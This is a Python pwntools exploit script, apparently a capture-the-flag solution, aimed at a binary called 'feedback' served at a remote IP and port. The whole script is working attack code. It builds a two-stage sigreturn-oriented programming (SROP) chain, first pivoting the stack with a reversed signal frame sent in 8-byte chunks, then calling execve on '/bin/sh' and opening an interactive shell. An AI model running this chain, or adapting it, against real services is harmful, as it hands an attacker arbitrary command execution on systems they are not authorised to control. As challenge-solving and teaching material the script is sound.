#!/usr/bin/python3

from pwn import *
import subprocess

context.binary = exe = ELF('./feedback', checksec=False)
context.arch='amd64'

# p = process(exe.path)
p = remote('139.180.134.15', 7331)

###########################
### Stage 1: First SROP ###
###########################
frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = 0x00000000402000
frame.rdx = 0x300
frame.rbp = 0x00000000402000
frame.rsp = 0x00000000402008
frame.rip = 0x401082
reverse_frame = b''.join([bytes(frame)[i:i+8] for i in range(len(frame), -1, -8)  ])

sigreturn = 0x00000000004010ce
payload = flat(
    bytes(reverse_frame),
    sigreturn,
    )
payload = payload.rjust(8*8189, b'P')
for i in range(0, len(payload), 8):
    print(i/8, end='\r')
    p.sendafter(b'complete', payload[i:i+8])
p.sendafter(b'complete', b'quitquit')

############################
### Stage 2: Second SROP ###
############################
syscall = 0x0000000000401067
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402108
frame.rsp = 0x00000000402000
frame.rip = syscall
payload = b'quitquit' + p64(sigreturn) + bytes(frame) + b'/bin/sh\x00'
p.send(payload)

p.interactive()

